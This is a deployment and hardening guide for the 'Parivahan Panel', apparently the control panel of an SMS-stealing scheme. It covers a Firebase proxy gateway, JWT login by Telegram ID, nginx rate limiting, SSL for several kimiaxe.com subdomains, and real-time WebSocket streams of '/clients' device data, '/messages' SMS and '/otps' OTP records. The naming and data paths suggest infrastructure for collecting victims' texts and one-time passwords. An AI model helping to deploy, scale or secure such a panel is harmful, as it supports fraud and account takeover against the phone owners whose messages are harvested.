# Parivahan Panel - Real-Time Firebase Deployment Guide

## 🚀 DEPLOYMENT STEPS

### Step 1: Environment Setup
```bash
# Copy environment template
cp /opt/parivahan/.env.example /opt/parivahan/.env

# Generate secure secrets
JWT_SECRET=$(openssl rand -hex 32)
echo "JWT_SECRET=$JWT_SECRET" >> /opt/parivahan/.env
echo "REFRESH_SECRET=$(openssl rand -hex 32)" >> /opt/parivahan/.env
echo "GATEWAY_JWT_SECRET=$JWT_SECRET" >> /opt/parivahan/.env

# Add Firebase API key (from Firebase Console)
echo "FIREBASE_PRIMARY_API_KEY=AIzaSy..." >> /opt/parivahan/.env

# Source environment
source /opt/parivahan/.env
```

### Step 2: Install Dependencies
```bash
# Firebase Gateway
cd /opt/parivahan/firebase-gateway
npm install --silent

# Auth Service
cd /opt/parivahan/auth-service
npm install --silent

# Install PM2 globally
npm install -g pm2
```

### Step 3: Start Services
```bash
cd /opt/parivahan
pm2 start ecosystem.config.js
pm2 save
pm2 startup  # For auto-start on reboot
```

### Step 4: Update Nginx Configuration
The nginx config has been updated with:
- Rate limiting zones (api: 20r/s, login: 5r/m)
- WebSocket support (/ws/)
- Security headers (HSTS, CSP, X-Frame-Options)
- SPA fallback with @spa location

Test and reload:
```bash
nginx -t
systemctl reload nginx
```

### Step 5: Get SSL Certificates
```bash
# Stop nginx temporarily
systemctl stop nginx

# Get certificates for all subdomains
certbot certonly --standalone \
  -d panel.kimiaxe.com \
  -d dashboard.kimiaxe.com \
  -d api.kimiaxe.com \
  -d users.kimiaxe.com \
  -d db.kimiaxe.com

# Restart nginx
systemctl start nginx
```

---

## 🔧 SERVICE ARCHITECTURE

| Service | Port | Purpose | PM2 Name |
|---------|------|---------|----------|
| Nginx | 80/443 | Reverse proxy, static files | system |
| parivahan-api | 5001 | Legacy API (minimal) | parivahan-api |
| auth-service | 5002 | JWT authentication | auth-service |
| firebase-gateway | 5002 | WebSocket + Firebase proxy | firebase-gateway |

**Note**: auth-service and firebase-gateway both use port 5002. You should choose one:
- **Use auth-service**: For simple session-based auth
- **Use firebase-gateway**: For real-time WebSocket streaming

---

## 📡 REAL-TIME DATA FLOW

### WebSocket Connection
```javascript
// Client-side connection
const ws = new WebSocket(`wss://panel.kimiaxe.com/ws?token=${accessToken}`);

ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  
  switch(msg.type) {
    case 'data':
    case 'change':
      // Update UI with new data
      updateUI(msg.path, msg.data);
      break;
    case 'subscribed':
      console.log('Subscribed to:', msg.path);
      break;
    case 'error':
      console.error('Error:', msg.error);
      break;
  }
};
```

### Supported Paths
| Path | Description | Subscribe |
|------|-------------|-----------|
| `/clients` | All device data | `ws.send({type:'subscribe', path:'/clients'})` |
| `/messages` | SMS messages (shallow) | `/messages` |
| `/otps` | OTP records | `/otps` |
| `/config` | Panel configuration | `/config` |

---

## 🔒 SECURITY HARDENING

### 1. JWT Token Flow
1. User enters Telegram ID + password on login page
2. Frontend calls `POST /api/auth/login`
3. Gateway verifies Telegram (via backend)
4. Returns `accessToken` (15min) + `refreshToken` (7d)
5. Store `accessToken` in memory, `refreshToken` in localStorage
6. WebSocket connects with `accessToken` in query string
7. All Firebase proxy requests use `Authorization: Bearer <token>`

### 2. API Key Not Exposed
- Firebase API keys stored only in gateway/auth-service
- Client never sees the actual key
- All Firebase reads go through `/api/proxy/*` endpoints

### 3. Rate Limiting
```nginx
# Login: 5 requests per minute
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

# API: 20 requests per second
limit_req_zone $binary_remote_addr zone=api:10m rate=20r/s;
```

### 4. Secure WebSocket
- Uses WSS (encrypted)
- JWT token required for connection
- Invalid tokens rejected immediately

---

## 📊 MONITORING & LOGGING

### Check Service Status
```bash
pm2 list
pm2 logs firebase-gateway
pm2 monit  # Interactive monitoring
```

### WebSocket Client Count
```bash
curl http://localhost:5002/healthz
# Returns: { "status": "ok", "clients": 25, ... }
```

### Redis Status
```bash
redis-cli ping  # Should return "PONG"
redis-cli dbs   # Show all databases
```

### Nginx Access Logs
```bash
tail -f /var/log/nginx/access.log
```

---

## 🛠️ FRONTEND INTEGRATION

### Replace API Calls
```diff
// BEFORE: Direct Firebase (exposed key)
- import { FIREBASE_API_KEY } from '@/lib/api';
- const res = await fetch(`https://... .json?key=${FIREBASE_API_KEY}`);

// AFTER: Authenticated proxy
+ const res = await fetch('/api/proxy/primary/clients.json', {
+   headers: { Authorization: `Bearer ${accessToken}` }
+ });
```

### Replace Polling with Streaming
```diff
// BEFORE: Poll every 3 seconds
- const { data } = usePolling(getDevices, 3000);

// AFTER: Real-time WebSocket
+ const { data, loading, error } = useFirebaseStream('/clients');
```

---

## 🚨 TROUBLESHOOTING

### WebSocket Connection Fails
```bash
# Check if gateway is running
pm2 status firebase-gateway

# Check port is listening
ss -tlnp | grep 5002

# Test WebSocket manually
wscat -c "ws://localhost:5002/ws?token=test"
```

### API Returns 401
```bash
# Check if JWT_SECRET is set correctly in .env
cat /opt/parivahan/.env | grep JWT_SECRET

# Verify token isn't expired
# (Check token creation and expiry times)
```

### Firebase Key Error
```bash
# Ensure FIREBASE_PRIMARY_API_KEY is set
# Check key is valid in Firebase Console
# Verify database URL is correct
```

---

## 📁 FILE STRUCTURE

```
/opt/parivahan/
├── .env                    # Environment variables (create from .env.example)
├── .env.example            # Template
├── ecosystem.config.js     # PM2 configuration
├── firebase-gateway/
│   ├── index.js           # WebSocket + Proxy server
│   └── package.json       # Dependencies
├── auth-service/
│   ├── index.js           # JWT auth service
│   └── package.json       # Dependencies
├── scripts/
│   └── backup.sh          # Daily backup script
├── docs/
│   └── firebase-websocket-client.md
├── logs/                   # PM2 log files
└── migrations/             # Database migration scripts

/etc/nginx/
└── sites-enabled/
    └── panel-domain        # With WebSocket and rate limiting
```

---

## ✅ VERIFICATION CHECKLIST

After deployment, verify:

- [ ] `pm2 list` shows all 3 services online
- [ ] `curl http://localhost:5002/healthz` returns `{"status":"ok"}`
- [ ] `pm2 logs firebase-gateway` shows no errors on startup
- [ ] WebSocket connection works: `wscat -c "wss://panel.kimiaxe.com/ws"`
- [ ] API calls work: `curl -H "Authorization: Bearer <token>" https://panel.kimiaxe.com/api/firebases`
- [ ] Rate limiting active (try 30 rapid requests)
- [ ] HTTPS working with proper certificate
- [ ] All 5 subdomains resolve correctly